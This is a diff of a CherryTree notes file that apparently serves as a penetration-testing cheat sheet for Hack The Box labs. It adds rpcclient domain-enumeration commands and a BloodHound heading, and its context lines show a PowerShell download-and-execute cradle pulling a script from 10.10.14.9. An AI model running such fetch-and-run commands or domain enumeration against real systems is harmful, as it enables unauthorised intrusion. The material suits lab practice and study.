@@ -56,7 +56,7 @@ tar -xf &lt;file_name&gt;</rich_text>
 unzip &lt;zip_file&gt;</rich_text>
     </node>
   </node>
-  <node name="QEMU/KVM+VIRTM" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1662477240" ts_lastsave="1665293185">
+  <node name="QEMU/KVM+VIRTM" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1662477240" ts_lastsave="1667389200">
     <rich_text>auto resize
 </rich_text>
     <rich_text family="monospace">xrandr --output Virtual-1 --auto</rich_text>
@@ -92,6 +92,24 @@ add the following to </rich_text>
     <rich_text family="monospace">/etc/fstab</rich_text>
     <rich_text>
 /hostshare /hostfiles 9p trans=virtio,version=9p2000.L,rw 0 0</rich_text>
+  </node>
+  <node name="rpcclient" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1667389200" ts_lastsave="1667389250">
+    <rich_text>querydominfo
+
+</rich_text>
+    <rich_text scale="h3" background="#f7f8f8" foreground="#4c4f53">enumdomusers</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3" background="#f7f8f8" foreground="#4c4f53">enumdomgroups</rich_text>
+    <rich_text>
+
+querygroup 0x200
+
+queryuser yashika
+
+</rich_text>
+    <rich_text scale="h3" background="#f7f8f8" foreground="#4c4f53">enumprivs</rich_text>
   </node>
   <node name="smbclient" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663434109" ts_lastsave="1666706008">
     <rich_text>list smbclient
@@ -673,8 +691,10 @@ wget</rich_text>
 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')</rich_text>
     </node>
-    <node name="check .net version" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664784197" ts_lastsave="1664784319">
-      <rich_text>C:\windows\microsoft.net\framework&gt; ls</rich_text>
+    <node name="check .net version" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664784197" ts_lastsave="1666855896">
+      <rich_text>C:\windows\microsoft.net\framework&gt; 
+cd C:\windows\microsoft.net\framework
+ls</rich_text>
     </node>
     <node name="check architecture" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664784323" ts_lastsave="1664784323">
       <rich_text justification="left" scale="h3">[Environment]::Is64BitProcess</rich_text>
@@ -728,7 +748,7 @@ mget *</rich_text>
   <node name="smb_enum" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663517460" ts_lastsave="1663517460">
     <rich_text link="webs https://steflan-security.com/hack-the-box-blue-walkthrough/">https://steflan-security.com/hack-the-box-blue-walkthrough/</rich_text>
   </node>
-  <node name="linux" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394178" ts_lastsave="1666706898">
+  <node name="linux" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394178" ts_lastsave="1666857630">
     <rich_text>knowing filetype
 file &lt;filename&gt;
 
@@ -885,6 +905,7 @@ dpkg -i &lt;package_file&gt;.deb</rich_text>
       <rich_text scale="h3">mount -t cifs \\\\10.10.11.174\\support-tools /mnt -o username=123,password=123</rich_text>
     </node>
   </node>
+  <node name="BloodHound" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1666857630" ts_lastsave="1666857630"/>
   <node name="python_module" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394196" ts_lastsave="1663435801">
     <node name="SimpleHTTPServer" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1655394751" ts_lastsave="1655394754">
       <rich_text>python -m SimpleHTTPServer &lt;port&gt;
